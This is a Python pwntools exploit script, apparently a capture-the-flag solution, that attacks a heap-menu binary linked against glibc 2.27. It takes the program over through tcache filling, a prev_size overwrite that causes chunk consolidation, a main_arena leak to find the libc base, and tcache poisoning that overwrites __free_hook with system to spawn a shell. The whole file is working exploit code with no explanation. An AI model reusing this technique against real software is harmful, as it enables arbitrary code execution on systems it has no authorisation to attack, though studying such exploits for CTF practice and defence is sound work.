from parse_args_and_some_func import *

sh:tube = all_parsed_args['io']
cur_elf:ELF = all_parsed_args['cur_elf']  
libc = cur_elf.libc
if not all_parsed_args["debug_enable"]:
    libc = ELF("/root/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so")


def ma(idx:int, size:int, content:(str, bytes)="aaaa"):
    assert idx >= 0 and idx < 0x20
    assert size > 0x7f and size <= 0x100
    sh.sendlineafter("4.show\n", "1")
    sh.sendlineafter("index:\n", str(idx))
    sh.sendlineafter("size:\n", str(size))
    msg = sh.recvline()
    log.info("{}".format(msg))
    addr = msg[6:-1]
    sh.sendafter("content:\n", content)
    return int16(addr.decode())


def fr(idx:int):
    assert idx >= 0 and idx < 0x20
    sh.sendlineafter("4.show\n", "2")
    sh.sendlineafter("index:\n", str(idx))


def ed(idx:int, content:(str, bytes)="aaaa"):
    assert idx >= 0 and idx < 0x20
    sh.sendlineafter("4.show\n", "3")
    sh.sendlineafter("index:\n", str(idx))
    sh.sendafter("content:\n", content)


def show(idx:int):
    assert idx >= 0 and idx < 0x20
    sh.sendlineafter("4.show\n", "4")
    sh.sendlineafter("index:\n", str(idx))
    msg = sh.recvline()
    log.info("msg recv:{}".format(msg))
    return msg

for i in range(8): # 0-7 
    ma(i, 0xf0)

ma(8, 0x98)
ma(9, 0xf0)
ma(10, 0x80) #隔开
ma(11, 0x90)

for i in range(8): # 0 - 7
    fr(i)
# STOP()

payload = 0x90 * b"a" + p64(0x1a0)
ed(8, payload)
fr(9) # unsorted bin

fr(11)
fr(8)


ma(0, 0xe0)

payload = p64(0) + p64(0xa1) + p64(0x6022b8)
ma(1, 0x80, payload)
ma(2, 0x100, "a" * 8) # get chunk from unsorted bin

ma(3, 0x90) # get tcache chunk
ma(4, 0x90, b'a' * 0x10)

ma(5, 0x80) # gap

msg = show(2)
leak_addr = msg[-7:-1]
main_arena_addr = u64(leak_addr.ljust(8, b"\x00"))
libc_base_addr = main_arena_addr - 0x3ebc40 - 368
LOG_ADDR('libc_base_addr', libc_base_addr)

free_hook_addr = libc_base_addr + libc.sym["__free_hook"]
system_addr = libc_base_addr + libc.sym["system"]

fr(3)

payload = p64(0) + p64(0xa1) + p64(free_hook_addr)
ed(1, payload)

ma(6, 0x90, "/bin/sh\x00")
ma(7, 0x90, p64(system_addr))

fr(6)

sh.interactive()